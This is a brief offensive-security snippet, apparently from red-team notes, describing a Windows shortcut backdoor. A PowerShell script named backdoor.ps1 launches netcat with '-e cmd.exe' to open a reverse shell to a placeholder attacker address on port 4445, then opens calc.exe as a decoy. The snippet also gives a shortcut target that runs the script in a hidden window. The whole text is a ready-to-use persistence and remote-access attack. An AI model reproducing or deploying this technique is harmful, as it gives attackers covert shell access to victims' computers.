
```backdoor_ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```


in the shortcut target, add the following
```Target
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

